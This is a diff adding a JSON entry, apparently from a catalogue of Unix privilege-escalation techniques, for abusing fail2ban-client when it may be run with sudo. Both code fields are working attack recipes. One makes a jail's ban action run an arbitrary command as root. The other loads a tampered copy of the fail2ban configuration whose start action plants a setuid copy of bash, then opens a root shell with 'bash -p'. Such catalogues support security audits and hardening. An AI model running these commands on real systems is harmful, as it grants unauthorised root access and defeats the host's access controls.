@@ -1,0 +1,14 @@
+{
+  "functions": {
+    "sudo": [
+      {
+        "description": "",
+        "code": "COMMAND=\"id\"\nsudo fail2ban-client add woot\nsudo fail2ban-client set woot addaction wootaction\nsudo fail2ban-client set woot action wootaction actionban \"$COMMAND\"\nsudo fail2ban-client start woot\nsudo fail2ban-client set woot banip 999.999.999.999\nsudo fail2ban-client set woot unbanip 999.999.999.999\nsudo fail2ban-client stop woot\n"
+      },
+      {
+        "description": "Loading tempered configuration file including code.\nRequires restarting the service.\nSince we, most likely, can't write into /etc/fail2ban/, we can copy the configuration folder to a temporary location and load this copy.\n",
+        "code": "TD_conf=$(mktemp -d)\nrsync -av /etc/fail2ban/ $TD_conf\nTD_exploit=$(mktemp -d)\ncat > $TD_exploit/exploit <<EOF\n#!/bin/sh\ncp /bin/bash $TD_exploit/bash\nchmod 755 $TD_exploit/bash\nchmod u+s $TD_exploit/bash\nEOF\nchmod +x $TD_exploit/exploit\ncat > $TD_conf/action.d/custom-start-command.conf <<EOF\n[Definition]\nactionstart = $TD_exploit/exploit\nEOF\ncat >> $TD_conf/jail.local <<EOF\n[my-custom-jail]\nenabled = true\naction = custom-start-command\nEOF\ncat > $TD_conf/filter.d/my-custom-jail.conf <<EOF\n[Definition]\nEOF\nsudo /usr/bin/fail2ban-client -c $TD_conf -v restart\n$TD_exploit/bash -p\n"
+      }
+    ]
+  }
+}
